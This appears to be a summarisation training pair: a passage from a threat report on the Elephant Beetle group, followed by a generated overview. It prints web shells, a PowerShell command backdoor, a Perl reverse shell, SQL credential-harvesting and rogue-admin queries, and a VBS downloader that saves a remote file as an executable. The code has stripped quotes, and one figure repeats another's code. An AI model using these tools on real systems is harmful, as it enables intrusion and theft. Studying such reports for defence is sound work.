@@ -1,0 +1,564 @@
+
+
+
+Sentence : From infiltration to victimization
+Because Elephant Beetle tends to exploit externally facing servers as the infiltration vector, the first servers that
+were discovered at the target’s network are the web applications infrastructure and other servers that are related
+to the compromised web application server and are accessible from their environment. In compromising the
+mentioned internal servers, the group leveraged either compromised credentials they gathered or similar exploits
+that were used to infiltrate the externally facing servers.
+The access to and from the compromised assets are mainly achieved by the group’s web shells and Java tools,
+both custom and open source, that provide tunneling capabilities of TCP packets and HTTP requests.
+The threat group move laterally within the network mainly through web application servers and SQL servers,
+leveraging known techniques such as Windows APIs (SMB/WMI) and ‘xp_cmdshell’, combined with custom
+remote execution volatile backdoors.
+For transferring tools and their outputs between compromised machines, the group leverage either a custom
+Java uploader/downloader tool or various web shells that have file uploading/downloading capabilities.
+Below is a high-level diagram that describes the lateral movement and access paths HTTP requests took, tunneled
+from an internet-facing server to an internal web server, and from that to other internal servers in more inner zones.
+Each of the tools and techniques that are presented in the following diagram will be discussed in this chapter.
+Figure 15: Lateral movement flow chart of the threat actor.
+Figure 16: The decapsulation of the HTTP requests sent for executing PowerShell backdoor on SQL instance, ordered by the stages on Figure 15.
+11
+After leveraging XP_CMDSHELL to execute the PowerShell backdoor on the MS-SQL server, the threat actor used
+the backdoor as the main remote execution tool on the compromised server and was able to continue its lateral
+movement within the core internal network. The figure below depicts a lateral movement scenario from the
+compromised MS-SQL server to a core server, using WMI access with privileged credentials.
+Figure 17: Lateral movement flow chart of the threat actor.
+Figure 18: The decapsulation of the HTTP requests sent for executing WmiExec.vbs on a core server via the PowerShell backdoor on the SQL
+instance, ordered by the stages on Figure 17.
+12
+They put a hex (string) on you
+Elephant Beetle deploy several tools for tunneling HTTP requests to web shells on internal web servers, which have
+less restricted access to other internal resources. One tool the group used was a custom web shell that receives
+HTTP parameters of a target host port and an encoded HTTP request payload (as a hex-string), creates a
+connection to the target machine, sends the request and prints the response.
+```
+<%@ page buffer=none %><%@page import=java.io., java.net., java.security.,javax.net.ssl.%><%!
+byte[] hexStringToByteArray(String s) {
+  int len = s.length();
+  byte[] data = new byte[len / 2];
+  for (int i = 0; i < len; i += 2) {
+data[i / 2] = (byte) ((Character.digit(s.charAt(i), 16) << 4)
+                + Character.digit(s.charAt(i+1), 16));
+  }
+  return data;
+}
+%><%
+String host=request.getParameter(host);
+String port=request.getParameter(port);
+String requestx=request.getParameter(request);
+…
+try{
+     if(host!=null && port!=null){
+           InputStream inSocket = null;
+           OutputStream outSocket = null;
+           if(host.indexOf(do-ssl-zero)>=0 && requestx!=null){
+                host=host.replaceAll(do-ssl-zero\.,);
+                SSLContext context=SSLContext.getInstance(SSL);
+                context.init(null, trustAllCerts, new java.security.SecureRandom());
+                SSLSocketFactory factory=context.getSocketFactory();
+                if(port==80){
+                      port=443;
+                }
+                SSLSocket sslsocket = (SSLSocket) factory.createSocket();
+                sslsocket.connect(new InetSocketAddress(host,
+Integer.parseInt(port)),30000);
+                sslsocket.setSoTimeout(30000);
+                outSocket = sslsocket.getOutputStream();
+                inSocket = sslsocket.getInputStream();
+           } else {
+                Socket socket = new Socket();
+                socket.connect(new InetSocketAddress(host, Integer.parseInt(port)), 30000);
+                if(requestx!=null){
+                      inSocket = socket.getInputStream();
+                      outSocket = socket.getOutputStream();
+                } else {
+                      out.print(true);
+                }
+           }
+           if(outSocket!=null){
+                outSocket.write(hexStringToByteArray(requestx));
+                int character;
+                while ((character = inSocket.read()) != -1) {
+                      out.print((char)character);
+                }
+           }
+     }
+} catch (Exception e) { out.println(An exception occurred: + e.getMessage()+\n); } %>
+```
+Figure 19: Code snippet of the HTTP Proxy Web shell.
+13
+One of the Java tools that was leveraged to tunnel traffic is a custom port forwarding tool that uses the open
+source library JSch by JCraft based on a specific code implementation example [10] from the JCraft website. The
+customization was mainly done to add flexibility to the threat group when executing it with providing command
+line parameters or a configuration file.
+```
+public class PortForwardingR {
+ public static void main(String[] arg) {
+…
+  } else {
+   System.out.println(\t[+] usage: [ [ username@hostname port port:host:hostport pass ] | file ]);
+   System.exit(0);
+  }
+  try {
+   JSch jsch = new JSch();
+   String user = host.substring(0, host.indexOf('@'));
+host = host.substring(host.indexOf('@') + 1);
+   Session session = jsch.getSession(user, host, port);
+   if (!kex.equals())
+session.setConfig(kex, kex);
+   int rport = Integer.parseInt(foo.substring(0, foo.indexOf(':')));
+foo = foo.substring(foo.indexOf(':') + 1);
+   String lhost = foo.substring(0, foo.indexOf(':'));
+   int lport = Integer.parseInt(foo.substring(foo.indexOf(':') + 1));
+session.setPassword(pass);
+session.setConfig(StrictHostKeyChecking, no);
+session.connect();
+session.setPortForwardingR(rport, lhost, lport);
+```
+Figure 20: Code snippet of the port forwarding Java tool.
+Another Java tool that was leveraged to tunnel traffic is a JSOCKS-like tool. This tool is a custom Java compiled
+version of the open source JSOCKS tool [11] and can be executed with command-line parameters or with a
+configuration file and its path as the parameter.
+```
+public class PortForwardingR {
+ public static void main(String[] arg) {
+…
+  } else {
+   System.out.println(\t[+] usage: [ [ username@hostname port port:host:hostport pass ] | file ]);
+   System.exit(0);
+  }
+  try {
+   JSch jsch = new JSch();
+   String user = host.substring(0, host.indexOf('@'));
+host = host.substring(host.indexOf('@') + 1);
+   Session session = jsch.getSession(user, host, port);
+   if (!kex.equals())
+session.setConfig(kex, kex);
+   int rport = Integer.parseInt(foo.substring(0, foo.indexOf(':')));
+foo = foo.substring(foo.indexOf(':') + 1);
+   String lhost = foo.substring(0, foo.indexOf(':'));
+   int lport = Integer.parseInt(foo.substring(foo.indexOf(':') + 1));
+session.setPassword(pass);
+session.setConfig(StrictHostKeyChecking, no);
+session.connect();
+session.setPortForwardingR(rport, lhost, lport);
+```
+Figure 21: Code snippet of the JSOCKS tool.
+10 http://www.jcraft.com/jsch/examples/PortForwardingL.java.html
+11 https://github.com/jitsi/jsocks
+14
+From backdoor to backdoor
+To facilitate the lateral movement, the group was observed using two different one-liner backdoors that were
+planted remotely on a machine via various techniques.
+The first backdoor is a Base64 encoded PowerShell one-liner backdoor that simulates a web server and provides
+remote code execution capabilities. Once executed, it binds with high port (65511, 65512 and 65513 were
+observed) and receives the command to execute from a POST request to / via a URL parameter named ‘kmd’.
+Then the command is executed by cmd.exe, and the output is sent as the response. If the request is other than
+the described above, the response will be 404.
+```
+[Reflection.Assembly]::LoadWithPartialName(System.Web) | Out-Null
+function extract($request) {
+$length = $request.contentlength64
+$buffer = new-object byte[] $length
+  [void]$request.inputstream.read($buffer, 0, $length)
+$body = [system.text.encoding]::ascii.getstring($buffer)
+$data = @{}
+$body.split('&') | % { $part = $_.split('=')
+$data.add($part[0], $part[1])
+  }
+  return $data
+}
+$routes = @{ POST / = { $data = extract $context.Request
+$decode = [System.Web.HttpUtility]:: UrlDecode($data.item('kmd'))
+$Out = cmd.exe /c $decode 2>&1 | Out-String
+    return $Out
+  }
+}
+$url = 'http://*:65512/'
+$listener = New-Object System.Net.HttpListener
+$listener.Prefixes.Add($url)
+$listener.Start()
+while ($listener.IsListening) {
+$context = $listener.GetContext()
+$requestUrl = $context.Request.Url
+$response = $context.Response
+$localPath = $requestUrl.LocalPath
+$pattern = {0} {1} -f $context.Request.httpmethod, $requestUrl.LocalPath
+$route = $routes.Get_Item($pattern)
+  if ($route -eq $null) {
+$response.StatusCode = 404
+  }
+  else {
+$content = & $route
+$buffer = [System.Text.Encoding]::UTF8.GetBytes($content)
+$response.ContentLength64 = $buffer.Length
+$response.OutputStream.Write($buffer, 0, $buffer.Length)
+  }
+$response.Close()
+$responseStatus = $response.StatusCode
+}
+…
+```
+Figure 22: The decoded version of the one-liner PowerShell backdoor.
+15
+The second backdoor is a Perl one-liner back-connect backdoor; It was executed on compromised Linux
+machines, and requires the C2 address and port for the outgoing connection. After establishing the connection,
+it executes an interactive shell that reads and writes from and to the socket.
+```
+perl -e 'use
+Socket;$i=;$p=;socket(S,PF_INET,SOCK_STREAM,getprotobyname(tcp));if(connect(S,soc
+kaddr_in($p,inet_aton($i)))){open(STDIN,>&S);open(STDOUT,>&S);open(STDERR,>&S);exec(/bin/sh -i);};
+```
+Figure 23: The Perl one-liner backdoor.
+In some cases, an additional backdoor was delivered to the victim machine named ‘Cli.exe’. This backdoor can
+either open a listener socket on the victim or actively connect back to Elephant Beetle’s C2 servers, allowing the
+execution of shellcode on the host via encrypted tunnel. When used to connect to C2 servers, the malware uses
+a set of hard coded certificates to establish the encrypted tunnel. The certificates were both created to be valid
+from March 29, 2018 UTC to January 16, 2021 UTC, with a difference of ~14 minutes.
+Figure 24: The hard-coded certificates for the Backdoor's SSL encryption .
+16
+The discovery phase
+The attackers used and leveraged SQL servers that were accessible in the network, which usually are desirable
+targets for attackers. During the discovery phase, the threat group scanned for internal MS-SQL servers. When
+finding such servers, they attempted to leverage the ‘xp_cmdshell’ SQL procedure for executing commands
+remotely on the server.
+The threat interacted with the internal SQL servers in three ways:
+
+Upload of a JSP/ASPX Web shell with SQL query capabilities to a web server that is accessible to the target
+
+MS-SQL server. When this web shell was accessed, they provided the connection string and credentials of the
+target MS-SQL server.
+
+Upload of a custom Java tool for querying SQL databases, and execution with the Java binary residing on
+
+the external server. The tool accepts as a parameter the Base64 encoded SQL query and path to a
+configuration file that contains the connection string and credentials of the target MS-SQL server.
+
+Use of the binary sqlcmd.exe for establishing SQL connection from a compromised SQL server to the target
+
+SQL servers.
+Code snippet from a JSP Web shell that allows SQL query execution:
+```
+…
+try{
+  String down=request.getParameter(download);
+  if(down!=null){
+response.setContentType(application/x-download);
+response.setHeader(Content-Disposition, attachment; filename=dump.html);
+  }
+  String upd=request.getParameter(update);
+  if(upd!=null){
+  }
+  Connection conn = null;
+  Statement st;
+  ResultSet rs;
+  String q=request.getParameter(query);
+    Class.forName(request.getParameter(class));
+conn = DriverManager.getConnection(request.getParameter(constr), request.getParameter(usr),
+request.getParameter(pwd));
+st=conn.createStatement();
+    if(upd!=null){
+           st.executeUpdate(q);
+    } else {
+           rs=st.executeQuery(q);
+           ResultSetMetaData rsmd = rs.getMetaData();
+…
+```
+Figure 25: Code snippet from the JSP Web shell with the SQL query capabilities.
+17
+Code snippet from the s0b.jar file (mentioned in the 2 [nd] bullet above), which allows local and remote SQL
+connections:
+```
+ public static void main(String[] args) {
+  if (args.length < 2) {
+   System.out.println([-] Use: java -jar s0.jar [conf] [b64_query]);
+   System.exit(0);
+  }
+  String query = ;
+  try {
+query = new String(MyBase64.decode(args[1]), UTF-8);
+…
+  try {
+x.load(new FileInputStream(args[0]));
+constr = x.getProperty(constr);
+usr = x.getProperty(usr);
+pwd = x.getProperty(pwd);
+classx = x.getProperty(class);
+…
+  try {
+   Class.forName(classx).newInstance();
+   Connection conn = DriverManager.getConnection(constr, usr, pwd);
+   Statement st = conn.createStatement();
+st.setQueryTimeout(6000);
+   if (isupdate == 1) {
+st.executeUpdate(query);
+…
+```
+Figure 26: Code snippet of the SQL query JAVA tool.
+After successful authentication with the target SQL server, the threat group performed reconnaissance activity
+by querying for the SQL instance version and other properties - and then attempted to obtain the SQL user’s
+passwords as detailed below:
+```
+select @@version
+SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins
+SELECT name + ' ' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins
+```
+Figure 27: Example of executed recon and creds harvest commands on a compromised SQL.
+To maintain persistence on the compromised SQL servers, the threat group created MS-SQL local accounts and
+assigned them the ‘sysadmin’ role. The users were created via SQL connection using the EXEC statement for
+executing the “sp_addlogin” and “sp_addsrvrolemember” SQL procedures. ALTER SERVER ROLE was also
+executed afterwards since “sp_addsrvrolemember” was deprecated in the version of the compromised SQL
+server, as in this command line example of SQL account creation and administrative role assignment:
+```
+EXEC sp_addlogin ‘’, ‘’
+EXEC master.dbo.sp_addsrvrolemember ‘’, ‘sysadmin’
+EXEC ALTER SERVER ROLE [sysadmin] ADD MEMBER []
+```
+Figure 28: Example of executed queries on a compromised SQL server for the privileged SQL account creation.
+18
+On the move
+As the attack reaches its final stages, the Elephant Beetle team especially enjoys a good Windows environment.
+When reaching a Windows domain environment, the threat group moved laterally and executed code remotely,
+with both WMI and SMB – either directly (WMIC.exe binary) or with some supporting scripts to optimize their
+operations.
+For lateral movement activity via SMB, the group leveraged the open-source script Invoke-SMBExec.ps1, [12] which
+is part of the Empire post exploitation framework. This PowerShell script allows remote code execution over
+Windows machines via SMB mechanism, and is well-known to be used by threat groups for lateral movement.
+The main tool that the group leveraged for lateral movement activity via WMI was a modified version of the open
+source pen testing script WmiExec.vbs [13]  - a VBS script that allows code execution and remote control over
+Windows machines via WMI mechanism.
+The customization was probably done to evade detection, as the main modifications were renaming indicative
+strings or variables, and adding the string replace function to dynamically transform a textual string.
+Some of the modifications are highlighted in the following code snippet from the modified WmiExec.vbs script:
+```
+If int4 < 2 Or int4 > 7 Then
+WScript.Echo arg
+     WScript.Quit 1
+End If
+If LCase(objArgs.Item(0)) <> /cmd And LCase(objArgs.Item(0)) <> /shell Then
+     WScript.Echo Mal!
+     WScript.Quit 1
+End If
+FileName = wmi.dll
+If int4 > 5 Then
+     FileName=objArgs.Item(5)
+     WScript.Echo FN: & FileName
+End If
+Const timeOut = 1200
+file = Path & \ & FileName
+file = Replace(file,\,)
+FilePath = fso.GetParentFolderName(file)
+sandtime = timeOut
+….
+WScript.Echo Target -> & host
+WScript.Echo Connecting...
+Set objLocator = CreateObject( Replace(wbemZcripting.Zwbemlocator,Z,s) )
+…
+Function Exec(cmd, file)
+     Set objS = objWMIService.Get( Replace(xin32_ProcessStartup,x,W) )
+```
+Figure 29: Code snippet of the group’s WmiExec.vbs modified version script.
+12 https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-SMBExec.ps1
+13 https://github.com/Twi1ight/AD-Pentest-Script/blob/master/wmiexec.vbs
+19
+How to fake legitimacy
+As is typical, these attackers tried to maintain a low profile, even when they are well into the active attack phase.
+The group took additional means to hide any files and outputs by relaying them between the compromised assets
+using several techniques. One way to achieve this is by executing a custom Java tool that binds to a socket and
+saves incoming data to a target file path.
+```
+import java.io.BufferedOutputStream;
+import java.io.FileOutputStream;
+import java.io.InputStream;
+import java.net.InetAddress;
+import java.net.ServerSocket;
+import java.net.Socket;
+public class FileTransferServer {
+ public static void main(String[] args) throws Exception {
+  if (args.length < 2) {
+   System.out.println( [+] Usage: Interface[localhost] Port /rout/to/save );
+   System.exit(0);
+  }
+  ServerSocket ssock = new ServerSocket(Integer.parseInt(args[1]));
+  System.out.println(\n\tListening.. );
+  Socket socket = ssock.accept();
+  System.out.println(\n\tConnected.. );
+  InetAddress IA = InetAddress.getByName(args[0]);
+  byte[] contents = new byte[10000];
+  FileOutputStream fos = new FileOutputStream(args[2]);
+  BufferedOutputStream bos = new BufferedOutputStream(fos);
+  InputStream is = socket.getInputStream();
+  int bytesRead = 0;
+  while ((bytesRead = is.read(contents)) != -1)
+bos.write(contents, 0, bytesRead);
+bos.flush();
+socket.close();
+ssock.close();
+  System.out.println(File sent succesfully!);
+ }
+}
+```
+Figure 30: Code snippet of the file transfer Java tool.
+Another technique that was used for lateral tool and tools’ outputs transfer by the threat group was to copy the
+desired files to transfer to accessible paths of a web application directory on web servers, and then access them
+as if they were legitimate web pages by custom VBS/Perl scripts.
+In other cases, the threat actor placed exfiltrated files and reconnaissance execution output files in an accessible
+path, directly downloadable from the internet, bypassing any DLP solutions in place.
+```
+dim xHttp: Set xHttp = createobject(Msxml2.ServerXMLHTTP)
+dim bStrm: Set bStrm = createobject(Adodb.Stream)
+xHttp.Open GET, http:////.zip, False
+xHttp.Send
+with bStrm
+.type = 1
+.open
+.write xHttp.responseBody
+.savetofile C:\windows\temp\.exe, 2
+end with
+```
+Figure 31: Code snippet from the file transfer VBS script.
+In addition to the two scenarios mentioned above, the group also deployed web shells with file upload/download
+20
+capabilities and leveraged SMB protocol for transferring files between Windows machines by copying them to
+and from open shares.
+Figure 32: Example for copying Procdump over SMB and exfiltrating result
+Using all of these techniques, the group could stage files between different compromised assets without the need
+for a complex backdoor tool on the assets.
+21
+Output : 
+### Overview of Elephant Beetle Attack Techniques
+
+The **Elephant Beetle** attack campaign showcases a sophisticated and multi-faceted approach to compromising networks. The attackers use a variety of tools and techniques to gain initial access, move laterally, maintain persistence, and exfiltrate data. Below is a detailed breakdown of the key methods and tools used by the Elephant Beetle group:
+
+### Initial Access
+
+1. **Web Shells:**
+   - **JSP/ASPX Web Shells:** These web shells are uploaded to web servers and can be accessed via HTTP requests. They provide command execution capabilities, allowing attackers to run arbitrary commands on the server.
+   - **SQL Query Capabilities:** Some of these web shells also allow for SQL query execution, enabling attackers to interact with internal SQL servers.
+
+2. **Custom Java Tools:**
+   - **s0b.jar:** This tool allows for local and remote SQL connections. It accepts a Base64 encoded SQL query and a configuration file containing the connection string and credentials.
+   - **FileTransferServer.java:** A custom Java tool that binds to a socket and saves incoming data to a target file path, facilitating file transfer between compromised assets.
+
+### Lateral Movement
+
+1. **WMI (Windows Management Instrumentation):**
+   - **Modified WmiExec.vbs:** The group uses a modified version of the open-source `WmiExec.vbs` script for remote code execution and control over Windows machines via WMI. Modifications include renaming strings and variables to evade detection.
+
+2. **SMB (Server Message Block):**
+   - **Invoke-SMBExec.ps1:** This PowerShell script, part of the Empire post-exploitation framework, is used for remote code execution over Windows machines via SMB.
+   - **Web Application Directory Exploits:** Files are copied to accessible paths in web application directories and accessed as if they were legitimate web pages using custom VBS/Perl scripts.
+
+### Persistence
+
+1. **MS-SQL Servers:**
+   - **Local Accounts Creation:** The threat group creates local MS-SQL accounts and assigns them the `sysadmin` role to maintain persistence.
+   - **SQL Query Execution:** They use SQL queries to gather information about the SQL instance, including version and user passwords.
+
+### Data Exfiltration
+
+1. **File Transfer Tools:**
+   - **Java FileTransferServer:** This tool is used to transfer files between compromised assets by binding to a socket and saving incoming data.
+   - **VBS/Perl Scripts:** Custom scripts are used to download exfiltrated files from accessible paths on web servers.
+
+2. **Web Shells with Upload/Download Capabilities:**
+   - These web shells allow attackers to upload and download files, facilitating the staging of tools and data between different compromised assets.
+
+### Reconnaissance
+
+1. **SQL Server Interaction:**
+   - **xp_cmdshell:** The `xp_cmdshell` SQL procedure is used to execute commands remotely on the server.
+   - **Recon Commands:** The threat group runs reconnaissance queries to gather information about the SQL instance, including version and user passwords.
+
+2. **Web Shell Access:**
+   - Web shells are used to upload and execute custom tools, allowing for further exploration of the network.
+
+### Techniques for Evasion
+
+1. **File Hiding and Transfer:**
+   - Files and outputs are relayed between compromised assets using various techniques, including custom Java tools and VBS/Perl scripts.
+   - Exfiltrated files are placed in accessible paths on web servers, making them directly downloadable from the internet.
+
+2. **Web Shell Usage:**
+   - Web shells with file upload/download capabilities are deployed to stage files without the need for complex backdoor tools.
+
+### Example Code Snippets
+
+1. **JSP Web Shell with SQL Query Capabilities:**
+   ```java
+   try {
+     String q = request.getParameter("query");
+     Class.forName(request.getParameter("class"));
+     Connection conn = DriverManager.getConnection(
+       request.getParameter("constr"),
+       request.getParameter("usr"),
+       request.getParameter("pwd")
+     );
+     Statement st = conn.createStatement();
+     if (request.getParameter("update") != null) {
+       st.executeUpdate(q);
+     } else {
+       ResultSet rs = st.executeQuery(q);
+       ResultSetMetaData rsmd = rs.getMetaData();
+       // Process results
+     }
+   } catch (Exception e) {
+     e.printStackTrace();
+   }
+   ```
+
+2. **File Transfer Java Tool:**
+   ```java
+   import java.io.BufferedOutputStream;
+   import java.io.FileOutputStream;
+   import java.io.InputStream;
+   import java.net.InetAddress;
+   import java.net.ServerSocket;
+   import java.net.Socket;
+
+   public class FileTransferServer {
+     public static void main(String[] args) throws Exception {
+       if (args.length < 2) {
+         System.out.println("[+] Usage: Interface[localhost] Port /rout/to/save");
+         System.exit(0);
+       }
+       ServerSocket ssock = new ServerSocket(Integer.parseInt(args[1]));
+       System.out.println("\n\tListening..");
+       Socket socket = ssock.accept();
+       System.out.println("\n\tConnected..");
+       InetAddress IA = InetAddress.getByName(args[0]);
+       byte[] contents = new byte[10000];
+       FileOutputStream fos = new FileOutputStream(args[2]);
+       BufferedOutputStream bos = new BufferedOutputStream(fos);
+       InputStream is = socket.getInputStream();
+       int bytesRead = 0;
+       while ((bytesRead = is.read(contents)) != -1) {
+         bos.write(contents, 0, bytesRead);
+       }
+       bos.flush();
+       socket.close();
+       ssock.close();
+       System.out.println("File sent successfully!");
+     }
+   }
+   ```
+
+3. **VBS Script for File Transfer:**
+   ```vbscript
+   dim xHttp: Set xHttp = createobject(Msxml2.ServerXMLHTTP)
+   dim bStrm: Set bStrm = createobject(Adodb.Stream)
+   xHttp.Open "GET", "http://<server>/<file>.zip", False
+   xHttp.Send
+   with bStrm
+     .type = 1
+     .open
+     .write xHttp.responseBody
+     .savetofile "C:\windows\temp\<file>.exe", 2
+   end with
+   ```
+
+### Conclusion
+
+The Elephant Beetle group demonstrates a high level of sophistication in their attack techniques, leveraging a combination of custom and modified tools to gain access, move laterally, maintain persistence, and exfiltrate data. By understanding these methods, organizations can better prepare and defend against similar threats.
